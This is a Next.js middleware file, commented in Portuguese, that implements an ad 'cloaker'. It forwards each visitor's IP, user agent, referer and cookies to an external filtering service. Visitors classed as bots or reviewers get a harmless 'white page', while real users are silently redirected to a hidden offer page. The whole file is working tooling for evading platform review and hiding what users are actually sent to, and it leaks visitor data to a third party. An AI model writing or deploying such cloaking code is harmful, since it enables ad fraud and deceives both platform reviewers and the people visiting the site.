import { NextResponse } from 'next/server'
import type { NextRequest } from 'next/server'

// Configuração do cloaker
const CLOAKER_CONFIG = {
  url: 'https://www.altercpa.one/fltr/969-8f076e082dbcb1d080037ec2c216d589-15047',
  whitePagePath: '/',  // Página principal agora é white page
  offerPagePath: '/quest'  // Página de oferta
}

export async function middleware(request: NextRequest) {
  const pathname = request.nextUrl.pathname
  
  // Verificar se o cloaker está habilitado
  const cloakerEnabled = process.env.NEXT_PUBLIC_CLOAKER_TRACKING_ENABLED === 'true'
  
  if (!cloakerEnabled) {
    return NextResponse.next()
  }

  // Não aplicar cloaker nas rotas internas e arquivos estáticos
  if (
    pathname.startsWith('/api') ||
    pathname.startsWith('/_next/') ||
    pathname.startsWith('/images') ||
    pathname.startsWith('/cupons') ||
    pathname.startsWith('/success') ||
    pathname.startsWith('/checkout') ||
    pathname.startsWith('/quest') ||  // Não aplicar cloaker na página de oferta
    pathname.startsWith('/fonts') ||
    pathname.startsWith('/manifest') ||
    pathname.startsWith('/icon-') ||
    pathname.startsWith('/sw.js') ||
    pathname.includes('.js') ||
    pathname.includes('.css') ||
    pathname.includes('.png') ||
    pathname.includes('.jpg') ||
    pathname.includes('.ico') ||
    pathname.includes('.woff') ||
    pathname.includes('.woff2') ||
    pathname.includes('.json')
  ) {
    return NextResponse.next()
  }

  // Aplicar cloaker apenas na rota raiz
  if (pathname !== '/') {
    return NextResponse.next()
  }

  try {
    // Preparar dados do servidor EXATAMENTE como o PHP faz
    const serverData = {
      HTTP_HOST: request.headers.get('host') || '',
      HTTP_USER_AGENT: request.headers.get('user-agent') || '',
      HTTP_ACCEPT: request.headers.get('accept') || '',
      HTTP_ACCEPT_LANGUAGE: request.headers.get('accept-language') || '',
      HTTP_ACCEPT_ENCODING: request.headers.get('accept-encoding') || '',
      HTTP_REFERER: request.headers.get('referer') || '',
      HTTP_X_FORWARDED_FOR: request.headers.get('x-forwarded-for') || '',
      HTTP_CF_CONNECTING_IP: request.headers.get('cf-connecting-ip') || '',
      REMOTE_ADDR: request.ip || request.headers.get('x-real-ip') || request.headers.get('x-forwarded-for') || '',
      REQUEST_URI: request.nextUrl.pathname + request.nextUrl.search,
      REQUEST_METHOD: request.method,
      SERVER_PROTOCOL: 'HTTP/1.1',
      QUERY_STRING: request.nextUrl.search.substring(1),
      HTTP_COOKIE: request.headers.get('cookie') || '',
      HTTP_SEC_CH_UA: request.headers.get('sec-ch-ua') || '',
      HTTP_SEC_CH_UA_MOBILE: request.headers.get('sec-ch-ua-mobile') || '',
      HTTP_SEC_CH_UA_PLATFORM: request.headers.get('sec-ch-ua-platform') || '',
    }

    console.log('🔍 [Cloaker] Verificando acesso:', {
      ip: serverData.HTTP_CF_CONNECTING_IP || serverData.REMOTE_ADDR,
      userAgent: serverData.HTTP_USER_AGENT,
      queryString: serverData.QUERY_STRING,
      url: request.nextUrl.pathname + request.nextUrl.search
    })

    // Fazer requisição para o cloaker (EXATAMENTE como o PHP)
    const formBody = new URLSearchParams(serverData as any).toString()
    
    const response = await fetch(CLOAKER_CONFIG.url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:135.0) Gecko/20100101 Firefox/135.0',
        'Accept-Encoding': 'gzip, deflate, br'
      },
      body: formBody
    })

    let result: { type: string; url: string; result?: string; action?: string; reason?: number }

    const responseText = await response.text()
    
    if (responseText && responseText.trim()) {
      try {
        result = JSON.parse(responseText)
        console.log('📥 [Cloaker] Resposta:', {
          type: result.type,
          result: result.result,
          action: result.action,
          reason: result.reason,
          url: result.url
        })
      } catch (e) {
        console.log('⚠️ [Cloaker] Erro ao parsear JSON - usando fallback (white)')
        result = {
          type: 'white',
          url: 'https://verifiedbyffire.store/'
        }
      }
    } else {
      console.log('⚠️ [Cloaker] Resposta vazia - usando fallback (white)')
      // Fallback IGUAL ao PHP: se vazio, mostrar white page
      result = {
        type: 'white',
        url: 'https://verifiedbyffire.store/'
      }
    }

    // Se for "white" (bot/crawler), mostrar white page (/)
    if (result.type === 'white') {
      console.log('🤖 [Cloaker] BOT detectado - mostrando white page (/)')
      // Deixar passar normalmente - a rota / já é a white page
      return NextResponse.next()
    }

    // Se for "black" (usuário real), REDIRECIONAR para /quest
    console.log('👤 [Cloaker] USUÁRIO REAL - redirecionando para /quest')
    const url = request.nextUrl.clone()
    url.pathname = CLOAKER_CONFIG.offerPagePath
    // Manter query params (utm, gclid, etc.)
    return NextResponse.redirect(url)

  } catch (error) {
    // Em caso de erro, mostrar white page por segurança (silencioso)
    const url = request.nextUrl.clone()
    url.pathname = CLOAKER_CONFIG.whitePagePath
    return NextResponse.rewrite(url)
  }
}

// Configurar em quais rotas o middleware deve rodar
export const config = {
  matcher: [
    /*
     * Match apenas a rota raiz e rotas específicas
     * Não aplicar em arquivos estáticos
     */
    '/',
    '/((?!api|_next|images|cupons|success|checkout|fonts|manifest|icon-|sw.js|.*\\..*).*)',
  ],
}
